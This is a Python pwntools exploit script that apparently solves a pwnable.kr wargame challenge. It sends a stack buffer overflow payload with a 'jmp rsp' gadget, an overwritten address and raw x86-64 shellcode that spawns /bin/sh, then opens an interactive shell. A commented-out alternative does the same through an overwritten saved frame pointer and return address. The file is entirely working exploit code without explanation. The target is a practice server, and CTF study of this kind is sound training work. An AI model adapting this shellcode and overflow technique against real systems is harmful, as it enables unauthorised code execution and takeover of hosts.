#!/usr/bin/python

from pwn import *

t = remote('pwnable.kr', 9010)
t.sendline('\xff\xe4\x00\x00'); # jmp rsp
t.sendline('1');
shellcode = '\x48\x83\xEC\x40\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
t.sendline('P' * 40 + p64(0x6020A0) + shellcode)
t.interactive()

'''
# alternative
sc = "\x48\x31\xf6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

p = remote('pwnable.kr', 9010)

filler = 'B'*8*4
saved_rbp = p64(0x602090)
ret_addr = p64(0x400870)

p.sendline(sc)
p.sendline('1')
p.sendline(filler+saved_rbp+ret_addr)
p.interactive()
'''
